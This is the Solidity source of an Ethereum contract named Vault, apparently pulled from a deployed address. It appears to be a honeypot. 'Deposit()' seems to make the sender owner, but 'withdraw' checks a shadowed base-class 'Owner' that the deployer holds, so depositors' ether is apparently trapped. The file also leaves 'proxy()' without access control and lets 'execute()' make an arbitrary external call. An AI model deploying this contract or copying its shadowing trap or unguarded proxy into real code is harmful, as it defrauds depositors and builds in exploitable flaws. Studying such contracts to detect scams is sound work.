/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Vault at 0x81c798ea668b6d7e07ea198014265e0c1d64b5a8
*/
pragma solidity ^0.4.17;

contract TokenProxy  {
    address public Proxy; bytes data;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwner(address _owner) onlyOwner { Owner = _owner; }
    address public Owner = msg.sender;
    function proxy(address _proxy)  { Proxy = _proxy; }
    function execute() returns (bool) { return Proxy.call(data); }
}

contract Vault is TokenProxy {
    mapping (address => uint) public Deposits;
    address public Owner;

    function () public payable { data = msg.data; }
    event Deposited(uint amount);
    event Withdrawn(uint amount);
    
    function Deposit() payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() payable {
        if (msg.value >= 1 ether) {
            Deposits[msg.sender] += msg.value;
            Deposited(msg.value);
        }
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
            Withdrawn(amount);
        }
    }
}